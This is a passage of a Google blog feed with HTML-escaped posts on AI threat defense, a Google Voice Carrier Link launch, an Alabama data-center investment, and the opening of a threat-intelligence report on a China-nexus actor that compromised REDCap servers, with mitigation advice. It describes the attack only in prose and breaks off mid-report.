+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Second, we invested in tracking our long-term remediation health. You can only improve what you measure. We built a comprehensive asset inventory to track our overall security posture and the completeness of our remediation efforts. Here’s where we hold ourselves accountable to product-level SLOs for vulnerability management. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;This system allows us to deploy rolling patches that can update even our data center hardware continuously and use AI agents to verify patch efficacy at a scale no human team could manage.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Third, we planned for the future by using AI agents for both coding and monitoring. You have to assume that at some point, the attackers' models will become more advanced. We need to evolve our operating model and build for that reality.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;We use AI agents to automate and standardize our response playbooks, enabling instantaneous containment when an issue is found. We move beyond just finding bugs by feeding key libraries into Gemini to improve its pattern recognition, creating security-aware coding agents. Meanwhile, our AI-assisted red teamers are continuously stress-testing our core infrastructure, ensuring our defenses are always evolving.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The outcome of this constant monitoring is a living, measured program that we can trust.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;This is how we protect billions of users every day, and it provides a framework that any team can use to build a defense that learns, adapts, and hardens itself against the threats of tomorrow.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To learn more about AI Threat Defense, you can watch our recent&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;a href="https://cloudonair.withgoogle.com/events/google-cloud-security-talks-june-2026?utm_source=cgc-blog&amp;amp;utm_medium=blog&amp;amp;utm_campaign=FY26-Q2-GLOBAL-STO55-onlineevent-er-dgcsm-JuneSecTl-172732&amp;amp;utm_content=blog&amp;amp;utm_term=-" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Security Talks online event&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;. &lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-aside"&gt;&lt;dl&gt;
+    &lt;dt&gt;aside_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;title&amp;#x27;, &amp;#x27;Learn something new&amp;#x27;), (&amp;#x27;body&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0bfc60a7f0&amp;gt;), (&amp;#x27;btn_text&amp;#x27;, &amp;#x27;Watch now&amp;#x27;), (&amp;#x27;href&amp;#x27;, &amp;#x27;https://www.youtube.com/watch?v=blh0hhHJ4pI&amp;#x27;), (&amp;#x27;image&amp;#x27;, &amp;lt;GAEImage: Cloud-CISO-Perspectives-logo-A&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph"&gt;&lt;h3&gt;&lt;b&gt;In case you missed it&lt;/b&gt;&lt;/h3&gt;&lt;p&gt;Here are the latest updates, products, services, and resources from our security teams so far this month:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;Detecting and containing AI-powered threats with Google Security Operations agents&lt;/b&gt;: Learn how Google Security Operations works in concert with AI Threat Defense to monitor, detect, and respond to threats, particularly from code you do not own or can not patch. &lt;a href="https://cloud.google.com/blog/products/identity-security/detecting-and-containing-powered-threats-with-google-security-operations-agents"&gt;&lt;b&gt;Read more&lt;/b&gt;&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;&lt;b&gt;How to stop AI voice clones from bypassing your security perimeter&lt;/b&gt;: The traditional, relatively stable network perimeter has been replaced by one far more malleable: Identity, driven by vishing attacks. Here’s how to defend against them. &lt;a href="https://cloud.google.com/transform/how-to-stop-ai-voice-clones-from-bypassing-your-security-perimeter"&gt;&lt;b&gt;Read more&lt;/b&gt;&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;&lt;b&gt;5 lessons from red teaming AI applications&lt;/b&gt;: Distilled from Mandiant’s hands-on red team experiences, check out our clear, concise guidance to help customers securely develop and deploy AI apps. &lt;a href="https://cloud.google.com/transform/5-lessons-from-red-teaming-ai-applications"&gt;&lt;b&gt;Read more&lt;/b&gt;&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;&lt;b&gt;Introducing Wiz Cloud Cost: Powering cost management and optimization with context&lt;/b&gt;: Wiz unifies cloud and AI cost visibility to help teams eliminate waste and improve spend efficiency across their AWS, Azure, and Google Cloud environments. &lt;a href="https://www.wiz.io/blog/introducing-wiz-cloud-cost" target="_blank"&gt;&lt;b&gt;Read more&lt;/b&gt;&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;&lt;b&gt;Bringing AI agents to Chrome Enterprise security management&lt;/b&gt;: We're launching an open-source model context protocol (MCP) server that connects AI agents directly to Chrome Enterprise APIs, helping IT and security teams manage browser security more efficiently. &lt;a href="https://blog.google/security/bringing-ai-agents-to-chrome-enterprise-security-management/" target="_blank"&gt;&lt;b&gt;Read more&lt;/b&gt;&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;&lt;b&gt;How Google Does It: An inside look at cybersecurity&lt;/b&gt;: Learn how Google approaches some of today's most pressing security topics, challenges and concerns, straight from Google experts. &lt;a href="https://blog.google/innovation-and-ai/infrastructure-and-cloud/google-cloud/how-google-does-it-security-series/" target="_blank"&gt;&lt;b&gt;View the collection&lt;/b&gt;&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Please visit the Google Cloud blog for more security stories &lt;a href="https://cloud.google.com/blog/products/identity-security"&gt;published this month&lt;/a&gt;.&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-aside"&gt;&lt;dl&gt;
+    &lt;dt&gt;aside_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;title&amp;#x27;, &amp;#x27;Join the Google Cloud CISO Community&amp;#x27;), (&amp;#x27;body&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0bfc60aa00&amp;gt;), (&amp;#x27;btn_text&amp;#x27;, &amp;#x27;Learn more&amp;#x27;), (&amp;#x27;href&amp;#x27;, &amp;#x27;https://rsvp.withgoogle.com/events/google-cloud-ciso-community-interest-form-2026?utm_source=cgc-blog&amp;amp;utm_medium=blog&amp;amp;utm_campaign=FY25-Q1-global-GCP30328-physicalevent-er-dgcsm-parent-CISO-community-2025&amp;amp;utm_content=cisop_&amp;amp;utm_term=-&amp;#x27;), (&amp;#x27;image&amp;#x27;, &amp;lt;GAEImage: GCAT-replacement-logo-A&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph"&gt;&lt;h3&gt;&lt;b&gt;Threat Intelligence news&lt;/b&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;Seeking counsel: Ongoing targeted campaign against U.S. law firms&lt;/b&gt;: Mandiant Consulting details a financially-motivated data theft extortion campaign executed by the threat cluster UNC3753, highlighting tactics like physical office targeting, and provides actionable recommendations to safeguard endpoints and infrastructure. &lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms"&gt;&lt;b&gt;Read more&lt;/b&gt;&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;&lt;b&gt;Welcome to BlackFile: Inside a vishing extortion operation&lt;/b&gt;: Google Threat Intelligence Group (GTIG) has continued to track an expansive extortion campaign by UNC6671, a threat actor operating under the "BlackFile" brand, that targets organizations via sophisticated voice phishing (vishing) and single sign-on (SSO) compromise. &lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/blackfile-vishing-extortion-operation"&gt;&lt;b&gt;Read more&lt;/b&gt;&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;&lt;b&gt;2 PhaaS 2 Furious: The evolution of Chinese-language phishing services&lt;/b&gt;: While Russian-speaking threat actors have historically dominated the phishing-as-a-service (PhaaS) landscape, a rival ecosystem is rapidly growing within the Chinese-language underground. Within this ecosystem, GTIG has observed a fundamental move away from static password harvesting towards real-time interception and tokenization. &lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/chinese-language-phishing-services"&gt;&lt;b&gt;Read more&lt;/b&gt;&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Please visit the Google Cloud blog for more threat intelligence stories &lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/"&gt;published this month&lt;/a&gt;.&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph"&gt;&lt;h3&gt;&lt;b&gt;Now hear this: Podcasts from Google Cloud&lt;/b&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;Cloud Security Podcast: Deceiving adversaries at scale&lt;/b&gt;: Kevin Conley from Riot Games discusses how modern organizations can use deception technology to gain a home-field advantage against adversaries by proactively monitoring their environments. &lt;a href="https://www.youtube.com/watch?v=1TjSIDXNcu8&amp;amp;t=38s" target="_blank"&gt;&lt;b&gt;Listen here&lt;/b&gt;&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;&lt;b&gt;Cloud Security Podcast: Hyperscaling cloud security with Wiz&lt;/b&gt;: Yinon Costica, co-founder and VP of product, Wiz, discusses how the company used a product-led approach and a unique security graph model to scale rapidly within the competitive cloud security market. &lt;a href="https://www.youtube.com/watch?v=Csk7I9Utw_U" target="_blank"&gt;&lt;b&gt;Listen here&lt;/b&gt;&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;&lt;b&gt;Behind the Binary: When AI features create zero-click exploits&lt;/b&gt;: Google Project Zero’s Seth Jenkins joins the podcast to dissect a full two-bug, zero-click exploitation chain targeting the Pixel 9. &lt;a href="https://www.youtube.com/watch?v=U80NrIRrjy0&amp;amp;list=PLjiTz6DAEpuLAykjYGpAUDL-tCrmTpXTf&amp;amp;index=1&amp;amp;t=3s" target="_blank"&gt;&lt;b&gt;Listen here&lt;/b&gt;&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;To have our Cloud CISO Perspectives post delivered twice a month to your inbox, &lt;a href="https://cloud.google.com/resources/google-cloud-ciso-newsletter-signup"&gt;sign up for our newsletter&lt;/a&gt;. We’ll be back in a few weeks with more security-related updates from Google Cloud.&lt;/p&gt;&lt;/div&gt;</content>
+    <link href="https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-the-4-lessons-that-guided-ai-threat-defense/"/>
+    <category term="Google Cloud"/>
+    <published>2026-06-15T16:00:00+00:00</published>
+  </entry>
+  <entry>
+    <id>http://workspaceupdates.googleblog.com/2026/06/carrier-link-for-google-voice.html</id>
+    <title>Carrier Link for Google Voice</title>
+    <updated>2026-06-15T15:24:16+00:00</updated>
+    <content type="html">Carrier Link allows Workspace customers to easily add phone numbers and calling plans from a certified local carrier, leveraging a pre-configured multi-tenant implementation of SIP Link.&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="separator" style="clear: both; text-align: center;"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDxKa1_s_cn7n9z5IjmTH470XapQH-U3GOIZSVxNaCpEKaBJLi5tl93wx7nVLf4RbbjLigq4O1dvoiPtF-x-d8S0OgEIrUjoi_T_-yOzn91VcOJz0WKBojFHFaUtI4XZspMS8bWb0BtNc-Y5Azl2yNUIPIgLoXRgR52IyO1J0CQvJjfjghZuwNjhQQWAQL/s864/Carrier%20Link%20for%20Voice.png" style="margin-left: 1em; margin-right: 1em;"&gt;&lt;img alt="Flow chart showing how Carrier Link works" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDxKa1_s_cn7n9z5IjmTH470XapQH-U3GOIZSVxNaCpEKaBJLi5tl93wx7nVLf4RbbjLigq4O1dvoiPtF-x-d8S0OgEIrUjoi_T_-yOzn91VcOJz0WKBojFHFaUtI4XZspMS8bWb0BtNc-Y5Azl2yNUIPIgLoXRgR52IyO1J0CQvJjfjghZuwNjhQQWAQL/s16000/Carrier%20Link%20for%20Voice.png" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;This simplifies the process of setting up a cloud phone system, allowing customers to make and receive calls with payment handled by their local carrier and minimal configuration. Carrier Link is especially helpful for small businesses that want a reliable connection without the hassle of setting up their own hardware.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;We are launching this feature in &lt;a href="https://knowledge.workspace.google.com/admin/voice/google-voice-operating-system-and-browser-compatibility#SIP" target="_blank"&gt;20 countries&lt;/a&gt; with our Carrier Link partners, &lt;a href="https://www.tatacommunications.com/kaleyra/ucaas/voice-solutions-google-workspace?hs_preview=TKKWkQmY-211617092721" target="_blank"&gt;Tata Communications&lt;/a&gt; and &lt;a href="https://globalsolutions.telefonica.com/es/multinacionales/productos/servicios-de-voz/global-sip-trunk/" target="_blank"&gt;Telefonica Global Solutions&lt;/a&gt;, who have collaborated with Google Voice to offer services via alternative carriers.&lt;/div&gt;&lt;h3 style="text-align: left;"&gt;Getting started&lt;/h3&gt;&lt;div&gt;&lt;ul style="text-align: left;"&gt;&lt;li&gt;&lt;b&gt;Admins: &lt;/b&gt;Contact one of our Carrier Link partners to get started. They will provision the SIP Link licenses and phone numbers, which you can then assign to &lt;a href="https://support.google.com/a/answer/9037998" target="_blank"&gt;users&lt;/a&gt;, &lt;a href="https://support.google.com/a/answer/9250113" target="_blank"&gt;desk phones&lt;/a&gt;, &lt;a href="https://support.google.com/a/answer/9204988" target="_blank"&gt;auto-attendants&lt;/a&gt;, and &lt;a href="https://support.google.com/a/answer/9424746" target="_blank"&gt;ring groups&lt;/a&gt;. Visit the Help Center to &lt;a href="https://knowledge.workspace.google.com/admin/voice/carrier-link-works" target="_blank"&gt;learn more about Carrier Link requirements&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;&lt;b&gt;End users: &lt;/b&gt;There is no end user action required.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;h3 style="text-align: left;"&gt;Rollout pace&lt;/h3&gt;&lt;div&gt;&lt;ul style="text-align: left;"&gt;&lt;li&gt;&lt;a href="https://support.google.com/a/answer/172177" target="_blank"&gt;Rapid Release and Scheduled Release domains&lt;/a&gt;: Gradual rollout (up to 15 days for feature visibility) June 15, 2026&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;h3 style="text-align: left;"&gt;Availability&lt;/h3&gt;&lt;div&gt;&lt;ul style="text-align: left;"&gt;&lt;li&gt;Available to Workspace customers with SIP Link Standard and Premier subscriptions&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;h3 style="text-align: left;"&gt;Resources&lt;/h3&gt;&lt;div&gt;&lt;ul style="text-align: left;"&gt;&lt;li&gt;Google Workspace Admin Help: &lt;a href="https://knowledge.workspace.google.com/admin/voice/carrier-link-works" target="_blank"&gt;How Carrier Link works&lt;/a&gt;&lt;/li&gt;&lt;li&gt;Google Workspace Admin Help: &lt;a href="https://support.google.com/voice/answer/115061" target="_blank"&gt;Set up Google Voice&lt;/a&gt;&lt;/li&gt;&lt;li&gt;Google Workspace Admin Help: &lt;a href="https://knowledge.workspace.google.com/admin/voice/manage-carrier-link-numbers" target="_blank"&gt;Manage Carrier Link Number&lt;/a&gt;&lt;/li&gt;&lt;li&gt;Google Workspace Admin Help: &lt;a href="https://support.google.com/a/answer/9250113" target="_blank"&gt;Set up Voice desk phones for your organization&lt;/a&gt;&lt;/li&gt;&lt;li&gt;Google Workspace Admin Help: &lt;a href="https://support.google.com/a/answer/9204988" target="_blank"&gt;Set up an automated attendant&lt;/a&gt;&lt;/li&gt;&lt;li&gt;Google Workspace Admin Help: &lt;a href="https://support.google.com/a/answer/9424746" target="_blank"&gt;Set up ring groups&lt;/a&gt;&lt;/li&gt;&lt;li&gt;Google Workspace Updates  Blog: &lt;a href="https://workspaceupdates.googleblog.com/2022/10/google-voice-sip-link.html" target="_blank"&gt;Use SIP Link to link phone numbers from local carriers to Google Voice&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</content>
+    <link href="http://workspaceupdates.googleblog.com/2026/06/carrier-link-for-google-voice.html"/>
+    <category term="Workspace Updates"/>
+    <published>2026-06-15T15:24:16+00:00</published>
+  </entry>
+  <entry>
+    <id>https://blog.google/innovation-and-ai/infrastructure-and-cloud/global-network/alabama-investment-june-2026/</id>
+    <title>We’re strengthening our presence in Alabama through new investments and community support.</title>
+    <updated>2026-06-15T15:00:00+00:00</updated>
+    <content type="html">Google has announced a $1.5 billion investment for 2026 and 2027 to expand its data center campus in Jackson County, Alabama. Operating since 2019 on a repurposed former…</content>
+    <link href="https://blog.google/innovation-and-ai/infrastructure-and-cloud/global-network/alabama-investment-june-2026/"/>
+    <category term="The Keyword"/>
+    <published>2026-06-15T15:00:00+00:00</published>
+  </entry>
+  <entry>
+    <id>https://cloud.google.com/blog/topics/threat-intelligence/prc-targets-us-medical-research/</id>
+    <title>Public and Private Medical Community Targeted by China-Nexus Threat Actor Pursuing Artificial Intelligence, Cyber, Medical, and National Defense Research</title>
+    <updated>2026-06-15T14:00:00+00:00</updated>
+    <content type="html">&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;Written by: Patrick Whitsell, John McGuiness&lt;/p&gt;
+&lt;hr /&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Google Threat Intelligence Group (GTIG) has identified a sophisticated campaign attributed to UNC6508, a People's Republic of China (PRC)-nexus threat actor, targeting institutions in the North American academic, medical, and military research community. While remaining undetected for over a year, the threat actor compromised externally facing web applications, deployed bespoke malware, pivoted to sensitive internal systems, and abused enterprise administrative tools for covert data exfiltration. The threat actor had broad collection aspirations, including sensitive defense intelligence related to national security, Indo-Pacific command operations, artificial intelligence, uncrewed vehicle systems, cyber offensive programs, and medical research. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;GTIG disrupted the malicious infrastructure associated with this threat actor. Working with Mandiant Consulting, we notified the affected organizations upon detection and offered our assistance with remediation. We have updated &lt;/span&gt;&lt;a href="https://cloud.google.com/security/products/security-operations"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Google Security Operations&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; (SecOps) with relevant intelligence, enabling defenders to identify indicators of compromise (IOCs) within their networks. We encourage all users and customers to follow recommended best practices for &lt;/span&gt;&lt;a href="https://knowledge.workspace.google.com/admin/apps/best-practices-for-third-party-idp-and-google-workspace-configuration" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;third-party Identity Providers&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; (IdP) and ensure &lt;/span&gt;&lt;a href="https://knowledge.workspace.google.com/admin/security/about-2sv-enforcement-for-admins" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;2-Step Verification&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; (2SV) is enabled across all accounts.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Campaign Overview&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The campaign targeted a diverse set of national, state, and private medical entities. These organizations comprise world-renowned clinical providers, premier academic centers, North American military health institutions, professional advocacy groups, and health regulatory bodies. Their research areas span a broad spectrum of modern medicine, from molecular discovery and clinical drug trials to state-level public health policy and military readiness. They employ thousands of people with a combined research budget in the billions of dollars.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The earliest known compromise occurred in September 2023, after which GTIG observed a consistent operational pattern. The threat actor exploited externally facing &lt;/span&gt;&lt;a href="http://project-redcap.org" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;REDCap&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; (Research Electronic Data Capture) servers and deployed custom malware named INFINITERED to capture legitimate REDCap login credentials. Then, after remaining undetected for more than a year, UNC6508 used the captured credentials to access the victim’s internal network. The threat actor was also observed using the novel technique of manipulating domain content compliance rules for data exfiltration. Lastly, UNC6508 used sophisticated operations security (OpSec) techniques to conceal and obfuscate their activity. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;GTIG collaborated closely with Mandiant Consulting, the FLARE team, and Workspace Security on this effort to combine our threat intelligence, incident response, and reverse engineering expertise across Google Cloud. This enabled us to develop a complete picture of the &lt;/span&gt;&lt;a href="https://cloud.google.com/security/resources/insights/targeted-attack-lifecycle"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;attack lifecycle&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; from initial compromise to complete mission. &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;GTIG also extends thanks to the affected organizations for their cooperation and the valuable post-exploitation insights they shared.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Prevention, Detection, and Remediation&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;GTIG recommends defenders implement the following security measures, across all Cloud enterprise platforms, to mitigate this threat:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Secure Admin Accounts&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Enforce phishing-resistant &lt;/span&gt;&lt;a href="https://knowledge.workspace.google.com/admin/security/deploy-2-step-verification" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;2-Step Verification (2SV)&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; for enterprise administrator accounts, including through third-party Identity Providers.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Advanced Protection&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Consider enrolling highly sensitive accounts in our &lt;/span&gt;&lt;a href="https://landing.google.com/intl/en_in/advancedprotection/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Advanced Protection Program&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; for additional safeguards against malware and phishing attacks.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Prevent Cookie Theft&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Enforce &lt;/span&gt;&lt;a href="https://knowledge.workspace.google.com/admin/security/prevent-cookie-theft-with-session-binding" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Device Bound Session Credentials&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; (DBSC) with &lt;/span&gt;&lt;a href="https://knowledge.workspace.google.com/admin/security/protect-your-business-with-context-aware-access" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;CAA&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; for highly sensitive accounts on Windows devices to prevent session hijacking.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Monitor Audit Logs&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Enable &lt;/span&gt;&lt;a href="https://docs.cloud.google.com/logging/docs/audit/gsuite-audit-logging"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Audit logs&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; to analyze, monitor, and alert on changes to your data.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Control Data&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Define &lt;/span&gt;&lt;a href="https://knowledge.workspace.google.com/admin/security/about-dlp" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Data Loss Prevention (DLP) rules&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; to block or alert on external sharing of sensitive data.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Audit Compliance Rules&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Review &lt;/span&gt;&lt;a href="https://knowledge.workspace.google.com/admin/reports/admin-log-events" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Admin audit logs&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; and content compliance rules for unauthorized modifications.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;SIEM Coverage&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Consider using &lt;/span&gt;&lt;a href="https://cloud.google.com/security/products/security-operations"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Google Security Operations&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; (SecOps) and ensure Workspace logs are included in your Security Information and Event Management (SIEM) pipeline.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Password Protection&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Use Chrome Enterprise &lt;/span&gt;&lt;a href="https://support.google.com/chrome/a/answer/13597868?hl=en" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Password Leak Detection&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; to alert when potentially compromised password use is detected.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Patch REDCap&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Fully updated REDCap installations to the latest software version and ensure older versions are completely removed.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Monitor for INFINITERED&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Scan REDCap servers for the presence of INFINITERED using the provided YARA rule and IOCs.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Medical Research University Compromise&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In September 2023, a &lt;/span&gt;&lt;a href="http://project-redcap.org" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;REDCap&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; server belonging to a North American medical research institution was compromised. Continuing activity was observed through November 2025. During this time period, UNC6508 carried out the following attack chain.&lt;/span&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Exploit the REDCap server.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;After three months, deploy the INFINITERED malware.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;INFINITERED stealthily records credentials, and persists through upgrades, for more than a year.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Pivot to a domain admin account.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Add the malicious content compliance rule.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Silently “BCC-forward” matched emails to a threat actor-controlled account.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;&lt;/div&gt;
+&lt;div class="block-image_full_width"&gt;
+
+
+
+
+
+
+  
+    &lt;div class="article-module h-c-page"&gt;
+      &lt;div class="h-c-grid"&gt;
+  
+
+    &lt;figure class="article-image--large
+      
